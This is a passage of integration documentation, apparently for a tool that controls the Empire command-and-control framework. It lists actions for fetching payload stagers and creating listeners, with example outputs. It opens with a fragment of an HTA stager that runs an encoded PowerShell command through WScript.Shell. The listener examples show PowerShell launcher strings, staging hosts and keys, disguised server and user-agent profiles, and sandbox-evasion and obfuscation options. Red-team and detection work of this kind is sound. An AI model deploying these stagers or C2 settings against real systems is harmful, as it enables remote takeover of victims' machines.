CYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=='
new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html> 
action_result.data.\*.windows/hta.UserAgent.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.UserAgent.Description | string |  |   User-agent string to use for the staging request (default, none, or other). 
action_result.data.\*.windows/hta.UserAgent.Value | string |  |   default 
action_result.data.\*.windows/hta.ObfuscateCommand.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.ObfuscateCommand.Description | string |  |   The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only. 
action_result.data.\*.windows/hta.ObfuscateCommand.Value | string |  |   Token\\All\\1,Launcher\\STDIN++\\12467 
action_result.summary.StagerCreated | string |  |   True   

## action: 'get payload'
Get a stager by name

Type: **generic**  
Read only: **True**

Get a single stager using its name.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**stager_name** |  required  | Name of stager to get | string |  `empire stager name` 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.stager_name | string |  `empire stager name`  |   osx/macro 
action_result.status | string |  |   success 
action_result.message | string |  |   Total stagers: 1 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.stagers.\*.Name | string |  `empire stager name`  |   osx/macro 
action_result.data.\*.stagers.\*.Author | string |  |   @herman 
action_result.data.\*.stagers.\*.Description | string |  |   An OSX office macro. 
action_result.data.\*.stagers.\*.Comments | string |  `url`  |   http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac 
action_result.data.\*.stagers.\*.options.Listener.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Listener.Description | string |  |   Listener to generate stager for. 
action_result.data.\*.stagers.\*.options.Listener.Value | string |  `empire listener name`  |    
action_result.data.\*.stagers.\*.options.OutFile.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.OutFile.Description | string |  |   File to output AppleScript to, otherwise displayed on the screen. 
action_result.data.\*.stagers.\*.options.OutFile.Value | string |  |    
action_result.data.\*.stagers.\*.options.Language.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Language.Description | string |  |   Language of the stager to generate. 
action_result.data.\*.stagers.\*.options.Language.Value | string |  |   python 
action_result.data.\*.stagers.\*.options.SafeChecks.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.SafeChecks.Description | string |  |   Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True. 
action_result.data.\*.stagers.\*.options.SafeChecks.Value | string |  |   True 
action_result.data.\*.stagers.\*.options.UserAgent.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.UserAgent.Description | string |  |   User-agent string to use for the staging request (default, none, or other). 
action_result.data.\*.stagers.\*.options.UserAgent.Value | string |  |   default 
action_result.summary.total_stagers | numeric |  |   1   

## action: 'list payloads'
List all current stagers

Type: **generic**  
Read only: **True**

List all the stagers available in Empire.

#### Action Parameters
No parameters are required for this action

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.message | string |  |   Total stagers: 26 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.stagers.\*.Name | string |  `empire stager name`  |   osx/jar 
action_result.data.\*.stagers.\*.Author | string |  |   @herman 
action_result.data.\*.stagers.\*.Description | string |  |   Generates a JAR file. 
action_result.data.\*.stagers.\*.Comments | string |  `url`  |   A herman comment 
action_result.data.\*.stagers.\*.options.Listener.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Listener.Description | string |  |   Listener to generate stager for. 
action_result.data.\*.stagers.\*.options.Listener.Value | string |  `empire listener name`  |    
action_result.data.\*.stagers.\*.options.OutFile.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.OutFile.Description | string |  |   File to output duckyscript to. 
action_result.data.\*.stagers.\*.options.OutFile.Value | string |  `file name`  |   /tmp/out.jar 
action_result.data.\*.stagers.\*.options.Language.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Language.Description | string |  |   Language of the stager to generate. 
action_result.data.\*.stagers.\*.options.Language.Value | string |  |   python 
action_result.data.\*.stagers.\*.options.SafeChecks.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.SafeChecks.Description | string |  |   Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True. 
action_result.data.\*.stagers.\*.options.SafeChecks.Value | string |  |   True 
action_result.data.\*.stagers.\*.options.UserAgent.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.UserAgent.Description | string |  |   User-agent string to use for the staging request (default, none, or other). 
action_result.data.\*.stagers.\*.options.UserAgent.Value | string |  |   default 
action_result.data.\*.stagers.\*.options.Hijacker.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Hijacker.Description | string |  |   Generate dylib to be used in a Dylib Hijack. This provides a dylib with the LC_REEXPORT_DYLIB load command. The path will serve as a placeholder. 
action_result.data.\*.stagers.\*.options.Hijacker.Value | string |  |   False 
action_result.data.\*.stagers.\*.options.Architecture.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Architecture.Description | string |  |   Architecture: x86/x64 
action_result.data.\*.stagers.\*.options.Architecture.Value | string |  |   x86 
action_result.data.\*.stagers.\*.options.ProxyCreds.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.ProxyCreds.Description | string |  |   Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). 
action_result.data.\*.stagers.\*.options.ProxyCreds.Value | string |  |   default 
action_result.data.\*.stagers.\*.options.StagerRetries.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.StagerRetries.Description | string |  |   Times for the stager to retry connecting. 
action_result.data.\*.stagers.\*.options.StagerRetries.Value | string |  |   0 
action_result.data.\*.stagers.\*.options.Proxy.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Proxy.Description | string |  |   Proxy to use for request (default, none, or other). 
action_result.data.\*.stagers.\*.options.Proxy.Value | string |  |   default 
action_result.data.\*.stagers.\*.options.Keyboard.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Keyboard.Description | string |  |   Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, try DE, HR... 
action_result.data.\*.stagers.\*.options.Keyboard.Value | string |  |    
action_result.data.\*.stagers.\*.options.Interpreter.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Interpreter.Description | string |  |   Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe) 
action_result.data.\*.stagers.\*.options.Interpreter.Value | string |  |   powershell 
action_result.data.\*.stagers.\*.options.AppName.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.AppName.Description | string |  |   Name for the .war/.jsp. Defaults to listener name. 
action_result.data.\*.stagers.\*.options.AppName.Value | string |  |    
action_result.data.\*.stagers.\*.options.Obfuscate.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Obfuscate.Description | string |  |   Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only. 
action_result.data.\*.stagers.\*.options.Obfuscate.Value | string |  |   False 
action_result.data.\*.stagers.\*.options.ObfuscateCommand.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.ObfuscateCommand.Description | string |  |   The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only. 
action_result.data.\*.stagers.\*.options.ObfuscateCommand.Value | string |  |   Token\\All\\1,Launcher\\STDIN++\\1234567 
action_result.data.\*.stagers.\*.MinPSVersion | string |  |   2 
action_result.data.\*.stagers.\*.OpsecSafe | boolean |  |   True  False 
action_result.data.\*.stagers.\*.Background | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Base64.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Base64.Description | string |  |   Switch. Base64 encode the output. 
action_result.data.\*.stagers.\*.options.Base64.Value | string |  |   True 
action_result.data.\*.stagers.\*.options.PowershellPath.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.PowershellPath.Description | string |  `file name`  |   Path to powershell.exe 
action_result.data.\*.stagers.\*.options.PowershellPath.Value | string |  `file path`  `file name`  |   C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe 
action_result.data.\*.stagers.\*.options.LNKComment.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.LNKComment.Description | string |  |   LNK Comment. 
action_result.data.\*.stagers.\*.options.LNKComment.Value | string |  |    
action_result.data.\*.stagers.\*.options.Icon.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Icon.Description | string |  |   Path to LNK icon. 
action_result.data.\*.stagers.\*.options.Icon.Value | string |  `file path`  `file name`  |   C:\\program files\\windows nt\\accessories\\wordpad.exe 
action_result.data.\*.stagers.\*.options.AppIcon.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.AppIcon.Description | string |  |   Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none. 
action_result.data.\*.stagers.\*.options.AppIcon.Value | string |  |    
action_result.data.\*.stagers.\*.options.Delete.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Delete.Description | string |  |   Switch. Delete .bat after running. 
action_result.data.\*.stagers.\*.options.Delete.Value | string |  |   True 
action_result.data.\*.stagers.\*.options.BinaryFile.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.BinaryFile.Description | string |  |   File to output launcher to. 
action_result.data.\*.stagers.\*.options.BinaryFile.Value | string |  |   /tmp/empire 
action_result.data.\*.stagers.\*.options.Arch.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.Arch.Description | string |  |   Architecture of the .dll to generate (x64 or x86). 
action_result.data.\*.stagers.\*.options.Arch.Value | string |  |   x64 
action_result.data.\*.stagers.\*.options.OutputPath.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.OutputPath.Description | string |  |   Output path for the files. 
action_result.data.\*.stagers.\*.options.OutputPath.Value | string |  |   /tmp/ 
action_result.data.\*.stagers.\*.options.OutputPs1.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.OutputPs1.Description | string |  |   PS1 file to execute against the target. 
action_result.data.\*.stagers.\*.options.OutputPs1.Value | string |  |   default.ps1 
action_result.data.\*.stagers.\*.options.HostURL.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.HostURL.Description | string |  |   IP address to host the malicious ps1 file. 
action_result.data.\*.stagers.\*.options.HostURL.Value | string |  `url`  |   http://192.168.1.1:80 
action_result.data.\*.stagers.\*.options.OutputDocx.Required | boolean |  |   True  False 
action_result.data.\*.stagers.\*.options.OutputDocx.Description | string |  |   MSOffice document name. 
action_result.data.\*.stagers.\*.options.OutputDocx.Value | string |  |   empire.docx 
action_result.summary.total_stagers | numeric |  |   26   

## action: 'get server options'
Get a list of options for a specified listener type

Type: **generic**  
Read only: **True**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**listener_type** |  required  | Listener Type for which to get options | string |  `empire listener type` 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.listener_type | string |  `empire listener type`  |   dbx  http 
action_result.status | string |  |   success 
action_result.message | string |  |   Listener found: True 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.summary.listener_found | string |  |   True 
action_result.data.\*.Required | boolean |  |   True  False 
action_result.data.\*.Name | string |  `empire listener name`  |   StagerURI 
action_result.data.\*.Value | string |  |    
action_result.data.\*.Description | string |  |   URI for the stager. Must use /download/. Example: /download/stager.php   

## action: 'create server'
Create a new listener

Type: **generic**  
Read only: **False**

Create a listener in Empire.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**listener_type** |  required  | Type of Listener to create | string |  `empire listener type` 
**listener_name** |  required  | Name for listener | string |  `empire listener name` 
**options** |  optional  | JSON options for a listener - see output of get server options for examples | string | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.listener_type | string |  `empire listener type`  |   http_mapi 
action_result.parameter.listener_name | string |  `empire listener name`  |   bob_test 
action_result.parameter.options | string |  |   {"Port": "9090"} 
action_result.status | string |  |   success 
action_result.message | string |  |   Success: listener bob_test successfully started 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.success | string |  |   listener bob_test successfully started 
action_result.summary.success | string |  |   listener bob_test successfully started   

## action: 'get server'
Get a listener by name

Type: **generic**  
Read only: **True**

Returns the listener specified by the name.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**listener_name** |  required  | Listener Name | string |  `empire listener name` 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.listener_name | string |  `empire listener name`  |   http 
action_result.status | string |  |   success 
action_result.message | string |  |   Listener module: http, Listener type: None 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.listeners.\*.name | string |  `empire listener name`  |   http 
action_result.data.\*.listeners.\*.listener_category | string |  |   client_server 
action_result.data.\*.listeners.\*.module | string |  `empire listener type`  |   http 
action_result.data.\*.listeners.\*.ID | numeric |  |   1 
action_result.data.\*.listeners.\*.options.StagerURI.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.StagerURI.Description | string |  |   URI for the stager. Must use /download/. Example: /download/stager.php 
action_result.data.\*.listeners.\*.options.StagerURI.Value | string |  |    
action_result.data.\*.listeners.\*.options.ProxyCreds.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.ProxyCreds.Description | string |  |   Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). 
action_result.data.\*.listeners.\*.options.ProxyCreds.Value | string |  |   default 
action_result.data.\*.listeners.\*.options.KillDate.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.KillDate.Description | string |  |   Date for the listener to exit (MM/dd/yyyy). 
action_result.data.\*.listeners.\*.options.KillDate.Value | string |  |    
action_result.data.\*.listeners.\*.options.Name.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Name.Description | string |  |   Name for the listener. 
action_result.data.\*.listeners.\*.options.Name.Value | string |  `url`  |   http 
action_result.data.\*.listeners.\*.options.Launcher.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Launcher.Description | string |  |   Launcher string. 
action_result.data.\*.listeners.\*.options.Launcher.Value | string |  |   powershell -noP -sta -w 1 -enc  
action_result.data.\*.listeners.\*.options.DefaultProfile.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultProfile.Description | string |  |   Default communication profile for the agent. 
action_result.data.\*.listeners.\*.options.DefaultProfile.Value | string |  |   /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko 
action_result.data.\*.listeners.\*.options.ServerVersion.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.ServerVersion.Description | string |  |   Server header for the control server. 
action_result.data.\*.listeners.\*.options.ServerVersion.Value | string |  |   Microsoft-IIS/7.5 
action_result.data.\*.listeners.\*.options.Host.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Host.Description | string |  |   Hostname/IP for staging. 
action_result.data.\*.listeners.\*.options.Host.Value | string |  `url`  |   http://172.16.25.158:8080 
action_result.data.\*.listeners.\*.options.Port.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Port.Description | string |  |   Port for the listener. 
action_result.data.\*.listeners.\*.options.Port.Value | string |  |   8080 
action_result.data.\*.listeners.\*.options.WorkingHours.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.WorkingHours.Description | string |  |   Hours for the agent to operate (09:00-17:00). 
action_result.data.\*.listeners.\*.options.WorkingHours.Value | string |  |    
action_result.data.\*.listeners.\*.options.CertPath.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.CertPath.Description | string |  |   Certificate path for https listeners. 
action_result.data.\*.listeners.\*.options.CertPath.Value | string |  |    
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Description | string |  |   Number of missed checkins before exiting 
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Value | numeric |  |   60 
action_result.data.\*.listeners.\*.options.SlackChannel.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.SlackChannel.Description | string |  |   The Slack channel or DM that notifications will be sent to. 
action_result.data.\*.listeners.\*.options.SlackChannel.Value | string |  |   #general 
action_result.data.\*.listeners.\*.options.UserAgent.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.UserAgent.Description | string |  |   User-agent string to use for the staging request (default, none, or other). 
action_result.data.\*.listeners.\*.options.UserAgent.Value | string |  |   default 
action_result.data.\*.listeners.\*.options.BindIP.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.BindIP.Description | string |  |   The IP to bind to on the control server. 
action_result.data.\*.listeners.\*.options.BindIP.Value | string |  `ip`  |   0.0.0.0 
action_result.data.\*.listeners.\*.options.DefaultJitter.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultJitter.Description | string |  |   Jitter in agent reachback interval (0.0-1.0). 
action_result.data.\*.listeners.\*.options.DefaultJitter.Value | numeric |  |   0 
action_result.data.\*.listeners.\*.options.StagingKey.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.StagingKey.Description | string |  |   Staging key for initial agent negotiation. 
action_result.data.\*.listeners.\*.options.StagingKey.Value | string |  |   ?7naSHsK{;gopLVmAR,9l^]+\*hz)q/=v 
action_result.data.\*.listeners.\*.options.DefaultDelay.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultDelay.Description | string |  |   Agent delay/reach back interval (in seconds). 
action_result.data.\*.listeners.\*.options.DefaultDelay.Value | numeric |  |   5 
action_result.data.\*.listeners.\*.options.SlackToken.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.SlackToken.Description | string |  |   Your SlackBot API token to communicate with your Slack instance. 
action_result.data.\*.listeners.\*.options.SlackToken.Value | string |  |    
action_result.data.\*.listeners.\*.options.Proxy.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Proxy.Description | string |  |   Proxy to use for request (default, none, or other). 
action_result.data.\*.listeners.\*.options.Proxy.Value | string |  |   default 
action_result.summary.listener_module | string |  `url`  |   http   

## action: 'list servers'
Get all current listeners

Type: **generic**  
Read only: **True**

Returns all current Empire listeners.

#### Action Parameters
No parameters are required for this action

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.message | string |  |   Total listeners: 1 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.listeners.\*.name | string |  `empire listener name`  |   http 
action_result.data.\*.listeners.\*.listener_category | string |  |   client_server 
action_result.data.\*.listeners.\*.module | string |  `empire listener type`  |   http 
action_result.data.\*.listeners.\*.ID | numeric |  |   1 
action_result.data.\*.listeners.\*.options.StagerURI.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.StagerURI.Description | string |  |   URI for the stager. Must use /download/. Example: /download/stager.php 
action_result.data.\*.listeners.\*.options.StagerURI.Value | string |  |    
action_result.data.\*.listeners.\*.options.ProxyCreds.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.ProxyCreds.Description | string |  |   Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). 
action_result.data.\*.listeners.\*.options.ProxyCreds.Value | string |  |   default 
action_result.data.\*.listeners.\*.options.KillDate.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.KillDate.Description | string |  |   Date for the listener to exit (MM/dd/yyyy). 
action_result.data.\*.listeners.\*.options.KillDate.Value | string |  |    
action_result.data.\*.listeners.\*.options.Name.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Name.Description | string |  |   Name for the listener. 
action_result.data.\*.listeners.\*.options.Name.Value | string |  `empire listener name`  |   http 
action_result.data.\*.listeners.\*.options.Launcher.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Launcher.Description | string |  |   Launcher string. 
action_result.data.\*.listeners.\*.options.Launcher.Value | string |  |   powershell -noP -sta -w 1 -enc  
action_result.data.\*.listeners.\*.options.DefaultProfile.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultProfile.Description | string |  |   Default communication profile for the agent. 
action_result.data.\*.listeners.\*.options.DefaultProfile.Value | string |  |   /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko 
action_result.data.\*.listeners.\*.options.ServerVersion.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.ServerVersion.Description | string |  |   Server header for the control server. 
action_result.data.\*.listeners.\*.options.ServerVersion.Value | string |  |   Microsoft-IIS/7.5 
action_result.data.\*.listeners.\*.options.Host.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Host.Description | string |  |   Hostname/IP for staging. 
action_result.data.\*.listeners.\*.options.Host.Value | string |  `url`  |   http://172.16.25.158:8080 
action_result.data.\*.listeners.\*.options.Port.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Port.Description | string |  |   Port for the listener. 
action_result.data.\*.listeners.\*.options.Port.Value | string |  |   8080 
action_result.data.\*.listeners.\*.options.WorkingHours.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.WorkingHours.Description | string |  |   Hours for the agent to operate (09:00-17:00). 
action_result.data.\*.listeners.\*.options.WorkingHours.Value | string |  |    
action_result.data.\*.listeners.\*.options.CertPath.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.CertPath.Description | string |  |   Certificate path for https listeners. 
action_result.data.\*.listeners.\*.options.CertPath.Value | string |  |    
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Description | string |  |   Number of missed checkins before exiting 
action_result.data.\*.listeners.\*.options.DefaultLostLimit.Value | numeric |  |   60 
action_result.data.\*.listeners.\*.options.SlackChannel.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.SlackChannel.Description | string |  |   The Slack channel or DM that notifications will be sent to. 
action_result.data.\*.listeners.\*.options.SlackChannel.Value | string |  |   #general 
action_result.data.\*.listeners.\*.options.UserAgent.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.UserAgent.Description | string |  |   User-agent string to use for the staging request (default, none, or other). 
action_result.data.\*.listeners.\*.options.UserAgent.Value | string |  |   default 
action_result.data.\*.listeners.\*.options.BindIP.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.BindIP.Description | string |  |   The IP to bind to on the control server. 
action_result.data.\*.listeners.\*.options.BindIP.Value | string |  `ip`  |   0.0.0.0 
action_result.data.\*.listeners.\*.options.DefaultJitter.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultJitter.Description | string |  |   Jitter in agent reachback interval (0.0-1.0). 
action_result.data.\*.listeners.\*.options.DefaultJitter.Value | numeric |  |   0 
action_result.data.\*.listeners.\*.options.StagingKey.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.StagingKey.Description | string |  |   Staging key for initial agent negotiation. 
action_result.data.\*.listeners.\*.options.StagingKey.Value | string |  |   ?7naSHsK{;gopLVmAR,9l^]+\*hz)q/=v 
action_result.data.\*.listeners.\*.options.DefaultDelay.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.DefaultDelay.Description | string |  |   Agent delay/reach back interval (in seconds). 
action_result.data.\*.listeners.\*.options.DefaultDelay.Value | numeric |  |   5 
action_result.data.\*.listeners.\*.options.SlackToken.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.SlackToken.Description | string |  |   Your SlackBot API token to communicate with your Slack instance. 
action_result.data.\*.listeners.\*.options.SlackToken.Value | string |  |    
action_result.data.\*.listeners.\*.options.Proxy.Required | boolean |  |   True  False 
action_result.data.\*.listeners.\*.options.Proxy.Description | string |  |   Proxy to use for request (default, none, or other). 
action_result.data.\*.listeners.\*.options.Proxy.Value | string |  |   default 
action_result.summary.total_listeners | numeric |  |   1 